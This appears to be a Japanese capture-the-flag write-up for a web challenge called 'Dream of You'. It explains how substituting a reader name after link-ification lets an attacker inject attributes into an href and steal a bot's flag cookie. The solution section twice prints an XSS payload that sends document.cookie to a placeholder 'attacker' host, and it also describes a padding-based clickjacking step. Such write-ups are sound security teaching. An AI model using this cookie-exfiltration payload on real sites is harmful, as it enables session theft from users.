@@ -1,0 +1,57 @@
+---
+title: "Dream of You"
+categories: ["web"]
+solves: 26
+---
+# 問題
+夢小説の投稿サイトがあり、`/submit` で投稿した内容を `/read/<id>` で閲覧できます。本文中の `[name]` は読者名に置換され、URL は自動的にリンク化されます。`/report` に投稿 ID を送ると、Reader Bot がそのページを閲覧し、`flag` をクッキーにセットした状態でページを操作します。
+
+Reader Bot は `flag` を `HttpOnly` にしていないため、XSS が成立すれば `document.cookie` から取り出せます。
+
+# 解法
+`[name]` の置換が linkify の後で行われている点に注目します。本文は一度サニタイズされた後に `bleach.linkify` でリンク化され、その後に `[name]` が単純な文字列置換で埋め込まれます。ここで `name` は `bleach.clean` されますが、属性用にエスケープされるわけではないため、`"` を含めると `href` を壊して属性を注入できます。
+
+```python showLineNumbers
+@app.get("/read/<int:story_id>")
+def read_story(story_id: int):
+    story = next((s for s in STORIES if s["id"] == story_id), None)
+    if story is None:
+        abort(404)
+    name = request.args.get("name") or story["default_name"]
+    name = sanitize_text(name.strip())
+    content = story["content"].replace("[name]", "[name] ")
+    sanitized = sanitize_text(content)
+    linkified = linkify_text(sanitized)
+    rendered = linkified.replace("[name]", name)
+    return render_template(
+        "read.html",
+        title=escape(story["title"]),
+        name=escape(name),
+        story=Markup(rendered),
+    )
+```
+
+本文に `https://example.com/?q=[name]` のような文字列を入れておくと、linkify によって
+`<a href="https://example.com/?q=[name]">...</a>` が生成されます。ここで `[name]` が `href` の中に現れるため、置換後に属性注入が可能になります。
+
+`"onfocus=fetch('https://attacker/?'+document.cookie) autofocus=`
+のような値を`default_name`に入れることができれば`<a href="https://example.com/?q="onfocus=fetch('https://attacker/?'+document.cookie) autofocus=">...</a>`となり、`href` を壊して `onfocus` と `autofocus` が注入されます。これでページ読み込み時に自動で `fetch` が実行され、Cookie が攻撃者に送信されます。
+しかし、`default_name` は 20 文字制限があるため、直接ペイロードを入れることはできません。
+
+さらに、`[name]` の後に空白が挿入されるため、URL の中盤に `[name]` を置いて後ろの文字列も使いながら属性注入することもできません。
+
+一方、`/read/<id>?name=...` の `name` パラメータには長さ制限がありません。よって、
+
+そこで、まず `default_name` に入る長さのinjectionで、ボットが名前を入力する際のクリックをジャッキングします。例えば `"style=padding:9%;` とすると、urlのクリック判定が広がり、ボットが`input[name='name']`をクリックした際に任意のURLに遷移させることができます。
+
+このリンク先を `/read/<id>?name=<payload>` にしておけば、ボットを任意 `name` を持ったページに遷移させることができます。ここで `name` に
+`"onfocus=fetch('https://attacker/?'+document.cookie) autofocus=`
+のような文字列を入れておくと、`href` から抜けて `onfocus` と `autofocus` が注入され、ページ読み込み時に自動で `fetch` が実行されます。
+
+`/read`にアクセスさせるためには`http://dream-of-you:5000`をURLとして指定する必要がありますが、これはlinkfyにはURLとして認識されないため、`https://redirectmeto.com/http://dream-of-you:5000`のようにしてリダイレクトを噛ませる必要があります。
+
+これで Reader Bot の `flag` クッキーが取得できます。
+
+
+
+`" 'x='`を使う方法や、`[name<img/>]`を使う方法などいくつか非想定解が存在しました。Web問題は非想定を潰すのが難しいことを思い知りました……
